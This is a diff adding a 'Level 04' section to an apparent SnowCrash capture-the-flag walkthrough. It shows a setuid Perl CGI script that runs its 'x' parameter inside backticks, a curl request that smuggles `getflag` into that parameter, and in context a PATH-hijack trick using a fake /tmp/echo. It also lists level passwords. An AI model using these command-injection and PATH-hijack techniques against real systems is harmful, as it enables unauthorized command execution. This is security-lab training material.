@@ -153,3 +153,38 @@ As we can see, there is a system call with `/usr/bin/env` of the echo file. We h
 level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo && chmod 755 /tmp/echo && export PATH=/tmp/:$PATH && ./level03
 ```
 After that we have to log with `level04` and give the password `qi0maab88jeaj46qoumi7maus`.
+
+
+## Level 04
+
+We can see level04 a `level04.pl` file in our home directory.
+
+```bash
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+When we `cat level04.pl` file, we can see a webserver running in localhost:4747 address.
+We can confirm the server running with this command :
+```bash
+level04@SnowCrash:~$ netstat -tunl | grep 4747
+tcp6       0      0 :::4747                 :::*                    LISTEN
+```
+
+As we can see the file content param `x`.
+As the website run command, we can write the following command to get the flag. The pipe is added to execute the getflag command.
+```bash
+level04@SnowCrash:~$ curl '192.168.1.30:4747/?x=`getflag`'
+```
+After that we have to log with `level05` and give the password `ne2searoevaevoem4ov4ar8ap`.
